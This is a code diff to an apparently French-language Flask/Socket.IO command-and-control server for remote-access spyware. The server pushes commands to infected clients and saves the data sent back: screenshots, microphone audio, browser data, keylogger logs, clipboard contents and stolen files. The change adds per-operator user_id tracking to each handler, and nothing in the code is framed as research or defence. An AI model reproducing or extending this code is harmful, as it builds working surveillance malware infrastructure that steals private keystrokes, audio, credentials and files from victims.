@@ -172,6 +172,7 @@ class HandleCommand(Resource):
     def post(self, client_id):
         command_data = request.get_json()
         command = command_data.get('command')
+        user_id = command_data.get('user_id')
         params = command_data.get('params', {})
 
         if isinstance(params, str):
@@ -183,7 +184,7 @@ class HandleCommand(Resource):
 
         client = Client.query.get(client_id)
         if client and client.status == 'online':
-            socketio.emit('command', {'command': command, 'params': params}, room=client.sid)
+            socketio.emit('command', {'command': command, 'params': params, 'user_id': user_id}, room=client.sid)
             app.logger.info(f"Commande *{command}* envoyée au client {client_id} / {client.ip}.")
             return {'status': 'success',
                     'message': f'Commande *{command}* envoyée au **client {client_id} / {client.ip}**.'}, 200
@@ -383,6 +384,7 @@ class ListDirectory(Resource):
     def post(self, client_id):
         data = request.json
         dir_path = data.get('dir_path')
+        user_id = data.get('user_id')
         if not dir_path:
             return {'status': 'error', 'message': 'Chemin du répertoire non spécifié.'}, 400
 
@@ -404,7 +406,8 @@ class ListDirectory(Resource):
                             type=CommandType.DIRECTORY_LISTING,
                             client_id=client_id,
                             dir_path=dir_path,
-                            date_created=datetime.now()
+                            date_created=datetime.now(),
+                            user_id=user_id
                         )
                         db.session.add(new_command)
                         db.session.commit()
@@ -473,6 +476,7 @@ def handle_system_info(data):
 @socketio.on('screenshot_response')
 def handle_screenshot(data):
     screenshot_bytes = base64.b64decode(data.get('screenshot'))
+    user_id = data.get('user_id')
     sid = request.sid
     client = Client.query.filter_by(sid=sid).first()
     if client:
@@ -483,7 +487,8 @@ def handle_screenshot(data):
         screenshot_path = f"{screenshot_dir}/{file_name}"
         with open(screenshot_path, 'wb') as f:
             f.write(screenshot_bytes)
-        new_command = Command(type=CommandType.SCREENSHOT, client_id=client.id, file_path=screenshot_path)
+        new_command = Command(type=CommandType.SCREENSHOT, client_id=client.id, file_path=screenshot_path,
+                              user_id=user_id)
         db.session.add(new_command)
         db.session.commit()
         app.logger.info(f"Capture d'écran reçue de {client_ip} et enregistrée sous {screenshot_path}")
@@ -492,6 +497,7 @@ def handle_screenshot(data):
 @socketio.on('audio_response')
 def handle_audio(data):
     audio_bytes = base64.b64decode(data.get('audio'))
+    user_id = data.get('user_id')
     sid = request.sid
     client = Client.query.filter_by(sid=sid).first()
     if client:
@@ -502,7 +508,7 @@ def handle_audio(data):
         audio_path = f"{audio_dir}/{file_name}"
         with open(audio_path, 'wb') as f:
             f.write(audio_bytes)
-        new_command = Command(type=CommandType.MICROPHONE, client_id=client.id, file_path=audio_path)
+        new_command = Command(type=CommandType.MICROPHONE, client_id=client.id, file_path=audio_path, user_id=user_id)
         db.session.add(new_command)
         db.session.commit()
         app.logger.info(f"Enregistrement audio reçu de {client_ip} et enregistré sous {audio_path}")
@@ -511,6 +517,7 @@ def handle_audio(data):
 @socketio.on('browser_data_response')
 def handle_browser_data(data):
     sid = request.sid
+    user_id = data.get('user_id')
     client = Client.query.filter_by(sid=sid).first()
     if client:
         browser = data.get('browser')
@@ -526,7 +533,8 @@ def handle_browser_data(data):
         new_command = Command(type=CommandType.BROWSER_DATA,
                               client_id=client.id,
                               file_path=file_path,
-                              browser_name=browser)
+                              browser_name=browser,
+                              user_id=user_id)
         db.session.add(new_command)
         db.session.commit()
         app.logger.info(f"Données du navigateur reçues de {client.ip} et enregistrées sous {file_path}")
@@ -535,6 +543,7 @@ def handle_browser_data(data):
 @socketio.on('keyboard_response')
 def handle_keyboard(data):
     sid = request.sid
+    user_id = data.get('user_id')
     client = Client.query.filter_by(sid=sid).first()
     if client:
         keylogger_dir = f"keyloggers/{client.ip}/{datetime.now().strftime('%Y-%m-%d')}"
@@ -544,7 +553,8 @@ def handle_keyboard(data):
         with open(keylogger_path, 'a', encoding='utf-8') as f:
             for key in data.get('keyboard_log'):
                 f.write(f"{key}\n")
-        new_command = Command(type=CommandType.KEYLOGGER, client_id=client.id, file_path=keylogger_path)
+        new_command = Command(type=CommandType.KEYLOGGER, client_id=client.id, file_path=keylogger_path,
+                              user_id=user_id)
         if db.session.query(Command).filter_by(file_path=keylogger_path).count() > 0:
             update_command = Command.query.filter_by(file_path=keylogger_path).first()
             update_command.date_updated = datetime.now()
@@ -559,6 +569,7 @@ def handle_keyboard(data):
 @socketio.on('clipboard_response')
 def handle_clipboard(data):
     sid = request.sid
+    user_id = data.get('user_id')
     client = Client.query.filter_by(sid=sid).first()
     if client:
         clipboard_dir = f"clipboards/{client.ip}/{datetime.now().strftime('%Y-%m-%d')}"
@@ -567,7 +578,8 @@ def handle_clipboard(data):
         clipboard_path = f"{clipboard_dir}/{file_name}"
         with open(clipboard_path, 'a', encoding='utf-8') as f:
             f.write(data.get('clipboard_content'))
-        new_command = Command(type=CommandType.CLIPBOARD, client_id=client.id, file_path=clipboard_path)
+        new_command = Command(type=CommandType.CLIPBOARD, client_id=client.id, file_path=clipboard_path,
+                              user_id=user_id)
         if db.session.query(Command).filter_by(file_path=clipboard_path).count() > 0:
             update_command = Command.query.filter_by(file_path=clipboard_path).first()
             update_command.date_created = datetime.now()
@@ -587,6 +599,7 @@ def handle_frame(data):
 @socketio.on('file_response')
 def handle_file(data):
     file_data = base64.b64decode(data.get('file'))
+    user_id = data.get('user_id')
     sid = request.sid
     client = Client.query.filter_by(sid=sid).first()
     if client:
@@ -597,7 +610,7 @@ def handle_file(data):
         file_path = f"{file_dir}/{file_name}"
         with open(file_path, 'wb') as f:
             f.write(file_data)
-        new_command = Command(type=CommandType.DOWNLOAD_FILE, client_id=client.id, file_path=file_path)
+        new_command = Command(type=CommandType.DOWNLOAD_FILE, client_id=client.id, file_path=file_path, user_id=user_id)
         db.session.add(new_command)
         db.session.commit()
         app.logger.info(f"Fichier reçu de {client_ip} et enregistré sous {file_path}")
